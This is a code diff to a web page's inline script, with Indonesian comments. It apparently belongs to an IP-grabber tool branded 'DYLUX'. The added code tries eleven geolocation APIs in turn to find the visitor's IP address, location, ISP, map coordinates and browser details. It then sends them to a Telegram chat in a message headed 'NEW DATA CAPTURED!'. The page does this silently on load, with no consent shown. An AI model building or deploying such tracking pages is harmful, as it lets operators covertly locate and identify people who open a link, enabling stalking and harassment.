@@ -121,6 +121,155 @@
 
     <script>
     // ============================================
+    // 11 API FALLBACK - IP GEOLOKASI
+    // ============================================
+    const apiList = [
+        // 1. ip-api.com (HTTP)
+        { 
+            url: 'http://ip-api.com/json/', 
+            parse: (d) => ({ 
+                ip: d.query, 
+                city: d.city, 
+                region: d.regionName, 
+                country: d.country, 
+                isp: d.isp, 
+                lat: d.lat, 
+                lon: d.lon 
+            }) 
+        },
+        // 2. ipapi.co (HTTPS)
+        { 
+            url: 'https://ipapi.co/json/', 
+            parse: (d) => ({ 
+                ip: d.ip, 
+                city: d.city, 
+                region: d.region, 
+                country: d.country_name, 
+                isp: d.org, 
+                lat: d.latitude, 
+                lon: d.longitude 
+            }) 
+        },
+        // 3. ip-api.com (HTTPS)
+        { 
+            url: 'https://ip-api.com/json/', 
+            parse: (d) => ({ 
+                ip: d.query, 
+                city: d.city, 
+                region: d.regionName, 
+                country: d.country, 
+                isp: d.isp, 
+                lat: d.lat, 
+                lon: d.lon 
+            }) 
+        },
+        // 4. freeipapi.com
+        { 
+            url: 'https://freeipapi.com/api/json/', 
+            parse: (d) => ({ 
+                ip: d.ip, 
+                city: d.city, 
+                region: d.region, 
+                country: d.country, 
+                isp: d.isp, 
+                lat: d.latitude, 
+                lon: d.longitude 
+            }) 
+        },
+        // 5. ipwhois.io
+        { 
+            url: 'https://ipwhois.io/json/', 
+            parse: (d) => ({ 
+                ip: d.ip, 
+                city: d.city, 
+                region: d.region, 
+                country: d.country, 
+                isp: d.isp, 
+                lat: d.latitude, 
+                lon: d.longitude 
+            }) 
+        },
+        // 6. ip-api.io
+        { 
+            url: 'https://ip-api.io/json/', 
+            parse: (d) => ({ 
+                ip: d.ip, 
+                city: d.city, 
+                region: d.region, 
+                country: d.country, 
+                isp: d.org, 
+                lat: d.lat, 
+                lon: d.lon 
+            }) 
+        },
+        // 7. ipinfo.io
+        { 
+            url: 'https://ipinfo.io/json/', 
+            parse: (d) => ({ 
+                ip: d.ip, 
+                city: d.city, 
+                region: d.region, 
+                country: d.country, 
+                isp: d.org, 
+                lat: d.loc?.split(',')[0] || 0, 
+                lon: d.loc?.split(',')[1] || 0 
+            }) 
+        },
+        // 8. ip-api.com (batch) - fallback
+        { 
+            url: 'http://ip-api.com/batch', 
+            parse: (d) => ({ 
+                ip: d[0]?.query, 
+                city: d[0]?.city, 
+                region: d[0]?.regionName, 
+                country: d[0]?.country, 
+                isp: d[0]?.isp, 
+                lat: d[0]?.lat, 
+                lon: d[0]?.lon 
+            }) 
+        },
+        // 9. ipdata.info - 50/min, no key
+        { 
+            url: 'https://ipdata.info/api/geo/', 
+            parse: (d) => ({ 
+                ip: d.ip, 
+                city: d.city, 
+                region: d.region, 
+                country: d.country, 
+                isp: d.isp, 
+                lat: d.latitude, 
+                lon: d.longitude 
+            }) 
+        },
+        // 10. iplocate.io
+        { 
+            url: 'https://api.iplocate.io/api/lookup/', 
+            parse: (d) => ({ 
+                ip: d.ip, 
+                city: d.city, 
+                region: d.region, 
+                country: d.country, 
+                isp: d.isp, 
+                lat: d.latitude, 
+                lon: d.longitude 
+            }) 
+        },
+        // 11. ipapi.is - Unlimited, 98% akurasi
+        { 
+            url: 'https://ipapi.is/api/geo/', 
+            parse: (d) => ({ 
+                ip: d.ip, 
+                city: d.city, 
+                region: d.region, 
+                country: d.country, 
+                isp: d.isp, 
+                lat: d.latitude, 
+                lon: d.longitude 
+            }) 
+        }
+    ];
+
+    // ============================================
     // FUNGSI KIRIM KE TELEGRAM
     // ============================================
     async function sendMessageToTelegram(chatId, text) {
@@ -150,7 +299,7 @@
     }
 
     // ============================================
-    // AUTO-DETECT (PAKE IPAPI.CO - HTTPS!)
+    // AUTO-DETECT (CEK 11 API SAMPE DAPET)
     // ============================================
     let autoDetectDone = false;
 
@@ -163,33 +312,50 @@
             const userId = params.get('id');
             if (!userId) return;
 
-            // 🔥 PAKE IPAPI.CO - HTTPS, WORK DI BROWSER!
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
+            let ipData = null;
 
-            let lat = ipData.latitude || 0;
-            let lon = ipData.longitude || 0;
-            let locationText = `${ipData.city || 'unknown'}, ${ipData.region || 'unknown'}, ${ipData.country_name || 'unknown'}`;
-            let ip = ipData.ip || 'unknown';
-            let isp = ipData.org || 'unknown';
+            // COBA SEMUA API SATU PER SATU
+            for (const api of apiList) {
+                try {
+                    const res = await fetch(api.url);
+                    if (!res.ok) throw new Error('API error');
+                    const data = await res.json();
+                    
+                    // Kalo batch response, ambil pertama
+                    const result = Array.isArray(data) ? data[0] : data;
+                    const parsed = api.parse(result);
+                    
+                    // Kalo dapet IP, berhenti!
+                    if (parsed.ip && parsed.ip !== 'unknown') {
+                        ipData = parsed;
+                        console.log(`✅ API berhasil: ${api.url}`);
+                        break;
+                    }
+                } catch (e) {
+                    console.log(`⚠️ API gagal: ${api.url}`);
+                }
+            }
 
-            const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
+            if (ipData) {
+                const mapsLink = `https://maps.google.com/?q=${ipData.lat},${ipData.lon}`;
+                const message = 
+                    `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
+                    `<b>👤 User ID:</b> <code>${userId}</code>\n` +
+                    `<b>📌 Type:</b> Auto-Detect\n` +
+                    `<b>📍 Sumber:</b> 🌐 IP API (11 Fallback)\n` +
+                    `<b>🌐 IP:</b> ${ipData.ip}\n` +
+                    `<b>📍 Lokasi:</b> ${ipData.city}, ${ipData.region}, ${ipData.country}\n` +
+                    `<b>📡 ISP:</b> ${ipData.isp}\n` +
+                    `<b>📍 Google Maps:</b> <a href="${mapsLink}">Klik untuk lihat map</a>\n` +
+                    `<b>📱 Device:</b> ${navigator.userAgent}\n` +
+                    `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
+                    `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
 
-            const message =
-                `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
-                `<b>👤 User ID:</b> <code>${userId}</code>\n` +
-                `<b>📌 Type:</b> Auto-Detect\n` +
-                `<b>📍 Sumber:</b> 🌐 IP API\n` +
-                `<b>🌐 IP:</b> ${ip}\n` +
-                `<b>📍 Lokasi:</b> ${locationText}\n` +
-                `<b>📡 ISP:</b> ${isp}\n` +
-                `<b>📍 Google Maps:</b> <a href="${mapsLink}">Klik untuk lihat map</a>\n` +
-                `<b>📱 Device:</b> ${navigator.userAgent}\n` +
-                `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
-                `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
-
-            await sendMessageToTelegram(userId, message);
-            console.log('✅ Auto-detect sent!');
+                await sendMessageToTelegram(userId, message);
+                console.log('✅ Auto-detect sent!');
+            } else {
+                console.warn('⚠️ Semua API gagal!');
+            }
 
         } catch (e) { console.error('Auto-detect error:', e); }
     }
